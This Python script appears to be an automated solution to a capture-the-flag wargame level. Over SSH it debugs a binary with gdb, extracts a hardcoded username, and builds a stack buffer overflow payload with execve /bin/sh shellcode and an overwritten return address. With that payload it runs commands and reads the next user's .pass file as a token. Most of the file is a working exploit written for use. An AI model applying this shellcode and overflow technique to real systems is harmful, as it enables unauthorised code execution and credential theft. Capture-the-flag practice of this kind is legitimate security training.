import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, find_offset
from utils.text import print_output, print_title, print_magic
from utils.base import save_token

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

output = exec(client, f'echo "test" | ./{binary_name}', title='Simple execute binary')
print_title('Okay, stdin intercepted, stdin write expected')
print_title('Send test in stdin')
print_output(output)
print_title("Let's find username!")
print_magic('Debug Time!')

func_info = exec(
    client,
    f'echo "info func" | gdb ./{binary_name} -q | egrep "verify_user_name|verify_user_pass|main"',
    title='Get all functions'
)
print_output(func_info)
print_title(
    'We have three entry points \n'
    '(0x08048464 - verify_user_name)\n'
    '(0x080484a3 - verify_user_pass)\n'
    '(0x080484d0 - main)'
)
print_title('Detailed view?')

main_structure = exec(
    client, f'echo "disass main" | gdb ./{binary_name} -q | egrep "93|102|185|176"',
    title='Get main structure'
)
print_output(main_structure)
print_title(f'Looks like main call verify_user_name and verify_user_pass func and do boolean check, reverse? Yeah!')

output = exec(
    client, f'echo "y" | (echo "test"; cat -) | (echo "test"; cat -) | gdb ./{binary_name} -q '
            f'-ex "b*verify_user_name+61" '
            f'-ex "b*verify_user_pass+43" '
            f'-ex "r" '
            f'-ex "set \$eax=0" '
            f'-ex "c" '
            f'-ex "set \$eax=0" '
            f'-ex "c" '
            f'-ex "q"',
    title='Rewrite eax to verify_user_name',
)
print_output(output)
print_title(
    "Yeah, username not a problem at now, but password still, boolean check not work"
)
print_title('Find answers at strings')

output = exec(
    client, f'strings {binary_name} | egrep "verifying username....|dat_wil|admin"',
)
print_output(output)
print_title('Looks like dat_wil is username and admin is password, check it')

output = exec(
    client, f'echo "admin" | (echo "dat_wil"; cat -) | ./{binary_name}',
    title='Rewrite eax to verify_user_name',
)
print_output(output)
print_title('We got username, but password not working, looks like broken if condition :(')
print_magic('Overflow time!!!!!!!!!!!!!!')

print_title('Find EIP offset, to overflow buffer and execute any binary')
offset = find_offset(client, register='eip', stdin=True, command_after_pattern='(echo "dat_wil"; cat -)')

system_call_sh = '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'
rewrite_address = '\\x47\\xa0\\x04\\x08'
shell_code = f"""(python -c "print 'dat_wil' + '{system_call_sh}' + '\\n' + '.' * {offset} + '{rewrite_address}'"; cat)"""
f = lambda command: f'echo "{command}" | {shell_code} | ./{binary_name}'

print_title('Prepare some data')
print_title(f'System call bin/sh is - {system_call_sh}')
print_title(f'Address to rewrite after buffer overflow - {rewrite_address}')

output = exec(client, f('whoami'), title='Try to overflow buffer, rewrite stack and call whoami command')
print_output(output)
print_title('Level02, yeah, what we need exactly')
print_title('Time to dirty tricks')
user = output[0]

output = exec(client, f(f'cat /home/users/{user}/.pass'), title='Steal password')
print_output(output)
print_title('Gotcha!')
token = output[0]

save_token(token, client)
